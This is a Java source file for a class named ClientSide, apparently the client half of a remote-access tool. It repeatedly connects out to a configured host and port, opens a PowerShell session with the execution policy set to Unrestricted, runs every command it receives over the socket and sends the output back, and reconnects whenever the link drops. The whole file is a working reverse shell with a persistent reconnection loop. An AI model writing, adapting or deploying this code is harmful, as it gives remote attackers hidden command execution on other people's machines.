package connection;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

import com.profesorfalken.jpowershell.PowerShell;
import com.profesorfalken.jpowershell.PowerShellResponse;

public class ClientSide {
	private Socket s;
	private String _ip;
	private int _port;
	private DataOutputStream dout;
	private DataInputStream din;
	private PowerShell powerShell;
	
	public ClientSide(String hostIP, int port) {
		_ip = hostIP;
		_port = port;
	}
	
	public void connect() {
		String received;
		try {
			reset();
		} catch (IOException e1) {
			return;
		}
		while(s.isConnected())
        {  
			try {
				received = din.readUTF();
				received = received.trim();
				if (received.contains("end connection") == true) {
					dout.writeUTF("Bye :(\n\n");
					dout.flush();
					s.close();
					powerShell.close();
					return;
				}
				else {
					PowerShellResponse response = powerShell.executeCommand(received);
					dout.writeUTF(response.getCommandOutput());
					dout.flush();
				}
	        } catch (Exception e1) {
	        	try {
	        		reset();
	        	}
	        	catch(IOException e2) {
	        		return;
	        	}
	        }
        }
	}
	
	private void reset() throws IOException {
		while(!initConnection());
		System.gc(); //Calls the garbage collector because of the previous function
		dout = new DataOutputStream(s.getOutputStream());
		din = new DataInputStream(s.getInputStream());
		dout.writeUTF("Setting up PowerShell session...");
		dout.flush();
		powerShell = PowerShell.openSession();
		powerShell.executeCommand("Set-ExecutionPolicy Unrestricted -Scope Process");
	}
	
	private boolean initConnection() {
        try
        {
            s = new Socket(_ip,_port);
            return true;
        }
        catch(Exception err)
        {
            return false;
        }
           
    }

}
